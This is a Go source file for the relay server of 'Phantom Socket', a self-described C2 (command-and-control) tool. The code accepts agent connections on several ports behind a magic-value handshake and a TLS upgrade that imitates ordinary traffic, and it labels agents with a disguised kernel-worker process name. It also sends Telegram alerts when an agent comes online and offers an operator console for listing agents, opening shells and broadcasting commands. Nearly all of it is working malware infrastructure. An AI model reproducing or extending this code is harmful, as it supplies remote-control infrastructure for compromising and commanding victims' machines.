// Project: Phantom Socket v1.0.1-stable
// Module: C2 Component
// Description: C2 Infrastructure component (Gacor Edition).

package main

import (
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/soket-io/gs-oyen-r/internal/config"
	"github.com/soket-io/gs-oyen-r/internal/crypto"
	"github.com/soket-io/gs-oyen-r/internal/peer"
	"github.com/soket-io/gs-oyen-r/internal/telegram"
	"github.com/soket-io/gs-oyen-r/internal/tls_mimic"
)

var (
	logger         *log.Logger
	activePeerID   string
	peerMutex      sync.Mutex
	consoleMode    bool
	promptMutex    sync.Mutex
	relayTLSConfig *tls.Config
)

type crlfWriter struct {
	writer io.Writer
}

func (w *crlfWriter) Write(p []byte) (n int, err error) {
	promptMutex.Lock()
	defer promptMutex.Unlock()

	if consoleMode {
		fmt.Print("\r\033[K")
	}

	buf := make([]byte, 0, len(p)*2)
	for i := 0; i < len(p); i++ {
		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
			buf = append(buf, '\r', '\n')
		} else {
			buf = append(buf, p[i])
		}
	}

	n, err = w.writer.Write(buf)

	if consoleMode {
		redrawPrompt()
	}

	return n, err
}

func redrawPrompt() {
	prompt := "phantom> "
	peerMutex.Lock()
	currentPeerID := activePeerID
	peerMutex.Unlock()

	if currentPeerID != "" {
		shortID := currentPeerID
		if len(shortID) > 13 {
			shortID = shortID[:13]
		}
		prompt = fmt.Sprintf("phantom(%s)> ", shortID)
	}
	fmt.Print(prompt)
}

func generateID(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	cfg := config.LoadFromEnv()
	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Primary relay server listen address")
	flag.Parse()

	logger = log.New(&crlfWriter{writer: os.Stderr}, "", log.LstdFlags)

	logger.Println("Phantom Socket v1.0.1-stable Relay Server Starting...")
	logger.Println("Building with Go 1.22+ for high-performance concurrency")

	cert, err := crypto.GenerateSelfSignedCert("oyen.serveftp.com", nil)
	if err != nil {
		logger.Fatalf("Failed to generate certificate: %v", err)
	}

	tlsConfig, err := tls_mimic.CreateRelayTLSConfig(cert)
	if err != nil {
		logger.Fatalf("Failed to create TLS config: %v", err)
	}
	relayTLSConfig = tlsConfig

	registry := peer.NewRegistry()

	// Multi-port listening (non-privileged only)
	ports := []string{":8443", ":8080", ":1337", ":42291"}
	for _, port := range ports {
		go func(p string) {
			listener, err := net.Listen("tcp", p)
			if err != nil {
				logger.Printf("[!] Failed to bind %s: %v", p, err)
				return
			}
			logger.Printf("[+] Listening on %s (Hybrid PSK+TLS mode)", p)
			for {
				conn, err := listener.Accept()
				if err != nil {
					continue
				}
				go handleConnection(conn, registry, cfg)
			}
		}(port)
	}


	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Print("\r\033[K")
		logger.Println("Shutting down relay server...")
		registry.CleanupInactivePeers(0)
		os.Exit(0)
	}()

	startInteractiveConsole(registry, cfg)
}

func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
	defer func() {
		if r := recover(); r != nil {
			conn.Close()
		}
	}()

	remoteAddr := conn.RemoteAddr().String()

	// 1. PSK Handshake
	pskBuf := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if _, err := io.ReadFull(conn, pskBuf); err != nil {
		conn.Close()
		return
	}

	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E { // "OYEN"
		logger.Printf("[!] PSK Mismatch from %s", remoteAddr)
		conn.Write([]byte{0}) // Reject
		conn.Close()
		return
	}

	// Send ACK '1'
	if _, err := conn.Write([]byte{1}); err != nil {
		conn.Close()
		return
	}

	// 2. TLS Upgrade
	tlsConn := tls.Server(conn, relayTLSConfig)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return
	}
	conn = tlsConn

	// 3. Register Peer
	peerID := generateID(12)
	p, err := registry.AddPeer(peerID, conn)
	if err != nil {
		logger.Printf("Failed to register agent: %v", err)
		conn.Close()
		return
	}

	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
	logger.Printf("[+] Agent Online [kworker/u4:0] (ID: %s)", peerID)

	telegram.SendAlert(telegram.AlertData{
		Type:          "v1.0.1-stable ONLINE",
		Hostname:      "N/A",
		User:          "N/A",
		IP:            remoteAddr,
		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
	})

	// Core loop for the peer
	handlePeer(p, registry)
}

func handlePeer(p *peer.PeerInfo, registry *peer.Registry) {
	defer registry.RemovePeer(p.PeerID)
	
	buf := make([]byte, 4096)
	for {
		p.Connection.SetReadDeadline(time.Now().Add(120 * time.Second))
		n, err := p.Connection.Read(buf)
		if err != nil {
			return
		}
		
		p.Mu.Lock()
		p.LastActivity = time.Now()
		p.BytesReceived += uint64(n)
		p.Mu.Unlock()
	}
}

func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
	consoleMode = true
	fmt.Println("Phantom Socket v1.0.1-stable Relay Console")
	fmt.Println("Type 'help' for available commands.")
	fmt.Println()
	redrawPrompt()

	for {
		var input string
		fmt.Scanln(&input)

		switch input {
		case "help", "?":
			fmt.Println("Commands:")
			fmt.Println("  sessions, list, agents - List connected agents")
			fmt.Println("  interact <id>          - Start interactive shell with agent")
			fmt.Println("  kill <id>              - Disconnect agent")
			fmt.Println("  broadcast <cmd>        - Send command to all agents")
			fmt.Println("  info                   - Show relay stats")
			fmt.Println("  exit, quit             - Shutdown relay")
		case "sessions", "list", "agents":
			peers := registry.GetAllPeers()
			if len(peers) == 0 {
				fmt.Println("[*] No active agents.")
			} else {
				fmt.Printf("[*] %d active agent(s):\n", len(peers))
				for id, p := range peers {
					p.Mu.RLock()
					fmt.Printf("    [+] %s | %s | %s | %s %s\n", id, p.RemoteAddr, p.ConnectedAt.Format("15:04:05"), p.OS, p.Arch)
					p.Mu.RUnlock()
				}
			}
		case "info":
			stats := registry.GetStats()
			fmt.Printf("[*] Relay Stats:\n")
			fmt.Printf("    Total Peers: %v\n", stats["total_peers"])
			fmt.Printf("    Active: %v\n", stats["active_peers"])
		case "exit", "quit":
			fmt.Println("[*] Shutting down relay server...")
			os.Exit(0)
		case "":
			// Do nothing
		default:
			fmt.Printf("[*] Unknown command: %s (type 'help' for commands)\n", input)
		}
		redrawPrompt()
	}
}
